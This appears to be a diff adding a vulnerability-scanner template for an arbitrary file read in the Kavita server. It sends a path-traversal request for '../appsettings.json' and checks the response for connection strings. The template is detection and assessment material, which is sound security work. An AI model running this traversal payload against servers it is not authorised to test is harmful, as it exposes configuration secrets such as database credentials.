@@ -1,0 +1,27 @@
+id: kavita-readfile-ct-483472
+info:
+  name: Kavita Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Exploits an arbitrary file read vulnerability in Kavita by accessing sensitive files via the `filename` parameter.
+  reference:
+    - https://huntr.dev/bounties/2eef332b-65d2-4f13-8c39-44a8771a6f18/
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/image/cover-upload?filename=../appsettings.json"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Microsoft.AspNetCore.Hosting.Internal.WebHost"
+          - "ConnectionStrings"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
